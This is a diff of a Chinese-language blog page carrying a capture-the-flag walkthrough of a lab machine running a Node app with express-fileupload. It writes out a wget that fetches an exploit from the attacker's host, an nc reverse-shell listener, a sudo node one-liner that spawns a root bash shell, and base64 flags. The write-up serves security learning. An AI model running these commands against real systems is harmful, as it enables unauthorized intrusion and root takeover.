 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104100808654.png" alt="image-20211104100808654"></p>
 <p>发现是另一个web应用，index.html（主页面），frontend（前端），backend（后端）</p>
 <p>进入backend目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd backend</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd backend<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104100901040.png" alt="image-20211104100901040"></p>
 <p>同样看到了package.json文件，进行查看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat package.json</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat package.json<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104101138166.png" alt="image-20211104101138166"></p>
 <blockquote>
 <p>{<br> “name”: “some-website”,<br> “version”: “1.0.0”,<br> “description”: “”,<br> “main”: “server.js”,<br> “scripts”: {<br>   “start”: “node server.js”<br> },<br> “author”: “”,<br> “license”: “ISC”,<br> “dependencies”: {<br>   “ejs”: “^3.1.5”,<br>   “express”: “^4.17.1”,<br>   <strong>“express-fileupload”: “^1.1.7-alpha.3”</strong>   #文件上传？？？？？？<br> }<br>}</p>
 </blockquote>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat server.js</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat server.js<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104101352160.png" alt="image-20211104101352160"></p>
 <blockquote>
@@ -280,7 +283,7 @@
 </blockquote>
 <p>kali:</p>
 <p>根据ip修改EXP</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi exp.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">vi exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104101833596.png" alt="image-20211104101833596"></p>
 <blockquote>
@@ -293,73 +296,73 @@
 </blockquote>
 <p>已将exp写在本地，需将该exp.py上传至目标端</p>
 <p>kali：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python3 -m http.server 80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104102630662.png" alt="image-20211104102630662"></p>
 <p>shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /tmp   #易向里写文件</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;tmp   #易向里写文件<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://10.0.2.4/exp.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">wget http:&#x2F;&#x2F;10.0.2.4&#x2F;exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104102839677.png" alt="image-20211104102839677"></p>
 <p>exp.py上传成功</p>
 <p>kali:</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">nc -nvlp 4444<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104103155596.png" alt="image-20211104103155596"></p>
 <p>shell：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 exp.py</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">python3 exp.py<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104103241230.png" alt="image-20211104103241230"></p>
 <p><strong>成功建立反弹shell</strong>，当前用户为imera</p>
 <p>结合之前的信息收集，得知imera用户主目录下有<strong>user.txt</strong>文件，进行查看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls -l</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104103811115.png" alt="image-20211104103811115"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat user.txt</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat user.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104103921395.png" alt="image-20211104103921395"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">byBjaHJvbm9zIHBlcm5hZWkgZmlsZSBtb3UK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <h3 id="4-最终提权"><a href="#4-最终提权" class="headerlink" title="4.最终提权"></a>4.最终提权</h3><p>尝试进入root目录</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd /root</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd &#x2F;root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104104228705.png" alt="image-20211104104228705"></p>
 <p>失败，在此需要提权</p>
 <p>尝试有没有sudo提权漏洞</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sudo -l <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104104353472.png" alt="image-20211104104353472"></p>
 <p>发现用户imera在没有root用户密码的权限下，只执行sudo，<strong>可以执行node和npm命令</strong></p>
 <p>搜集发现了一段代码（调用node执行生成一个子进程，子进程运行&#x2F;bin&#x2F;bash）</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo node -e &#x27;child_process.spawn(&quot;/bin/bash&quot;,&#123;stdio:[0,1,2]&#125;)&#x27;   </span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">sudo node -e &#39;child_process.spawn(&quot;&#x2F;bin&#x2F;bash&quot;,&#123;stdio:[0,1,2]&#125;)&#39;   <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">id<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104104738393.png" alt="image-20211104104738393"></p>
 <p>发现已经<strong>成功提权</strong>为root用户</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd root</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cd root<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pwd</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">pwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ls</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">ls<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat root.txt</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">cat root.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <p><img src="https://byesec-blog-img.oss-cn-beijing.aliyuncs.com/uPic/image-20211104104834470.png" alt="image-20211104104834470"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK</span><br></pre></td></tr></table></figure>
+<pre class="line-numbers language-none"><code class="language-none">YXBvcHNlIHNpb3BpIG1hemV1b3VtZSBvbmVpcmEK<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
 <hr>
 <h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><p>CyberChef:</p>
